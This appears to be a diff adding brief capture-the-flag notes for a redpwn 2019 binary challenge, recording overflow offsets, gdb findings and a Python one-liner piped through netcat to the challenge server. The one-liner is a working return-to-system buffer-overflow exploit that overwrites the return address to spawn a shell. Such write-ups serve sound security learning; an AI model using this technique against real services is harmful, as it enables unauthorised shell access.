@@ -1,0 +1,16 @@
+#Pattern b1Ab first occurrence at position 34 in pattern. eip
+#Pattern Ab0A first occurrence at position 30 in pattern. ebp
+#Pattern 8Aa9 first occurrence at position 26 in pattern. ebx
+
+#python -c 'print "A"*26 + "BBBB" + "CCCC" + "DDDD"'
+(python -c 'print "A"*26 + "BBBB" + "CCCC" + "\xd0\x83\x04\x08" + "DUMM" + "\x6c\x86\x04\x08"' ; cat) | nc chall.2019.redpwn.net 4002
+
+# 0x08048541 <+43>:	call   0x80483d0 <system@plt>
+# system("sh #")
+# base 0x08048000 + 0x660 = 0x8048660
+# x/s 0x8048660+12
+# 0x804866c:	"sh # hs\\\nib\\\\\\"
+
+The flag is literally:
+"cat: flag.txt: No such file or directory"
+wth
